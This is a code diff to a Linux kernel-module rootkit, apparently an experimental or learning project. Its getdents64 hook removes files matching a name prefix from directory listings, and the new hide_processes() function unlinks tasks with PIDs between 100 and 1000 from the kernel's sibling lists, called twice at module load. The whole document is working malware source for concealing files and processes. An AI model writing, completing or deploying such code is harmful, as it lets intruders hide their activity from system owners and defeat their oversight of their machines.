@@ -24,7 +24,7 @@
 #define OUR_MODULE_PUT 
 #endif
 
-//#define DEBUG_ON
+#define DEBUG_ON
 #ifdef DEBUG_ON
 #define OUR_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
 #else
@@ -135,15 +135,12 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
     OUR_TRY_MODULE_GET;
 
     result = original_getdents64(fd, dirent, count);
-    OUR_DEBUG("----------------- Here are the files ------------------------------------");
     cur_dirent = dirent;
 
     for (bpos=0; bpos < result;){
         cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
 
-        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
         if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
-            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
             //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
             cur_reclen = cur_dirent->d_reclen;
             memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
@@ -155,7 +152,6 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
         }
     }
 
-    OUR_DEBUG("----------------- End of file list ------------------------------------");
     OUR_MODULE_PUT
     return result;
 
@@ -199,6 +195,29 @@ int print_nr_procs(void){
     return 0;
 }
 
+void hide_processes(void){
+    struct task_struct* task;
+    struct task_struct* prev;
+    struct task_struct* next;
+    task = &init_task;
+    prev = NULL;
+    OUR_DEBUG("Now manipulating task_structs...\n");
+    do {
+        // the previous task (prev) is obtained by a expanded macro
+        //  found in the linux kernel. it is basically the 
+        //  adapted expansion of "next_task"
+        prev = list_entry_rcu(task->tasks.prev, struct task_struct, tasks);
+        next = next_task(task);
+        if ((task->pid > 100) && (task->pid < 1000)){
+            OUR_DEBUG("1 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
+            OUR_DEBUG("1 task %p, tc->next %p, tc->prev %p\n", &task->sibling, task->children.next, task->children.prev);
+            prev->sibling.next = task->sibling.next;
+            next->sibling.prev = task->sibling.prev;
+            OUR_DEBUG("2 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
+        }
+    } while ((task = next) != &init_task);
+}
+
 /* Initialization routine */
 static int __init _init_module(void)
 {
@@ -210,10 +229,8 @@ static int __init _init_module(void)
         printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
     }
 
-    task = &init_task;
-    do {
-        printk(KERN_INFO "Task %s (%d) hast parent: %s\n", task->comm, task->pid, task->parent->comm);
-    } while ((task = next_task(task)) != &init_task);
+    hide_processes();
+    hide_processes();
 
     print_nr_procs();
     hook_functions();
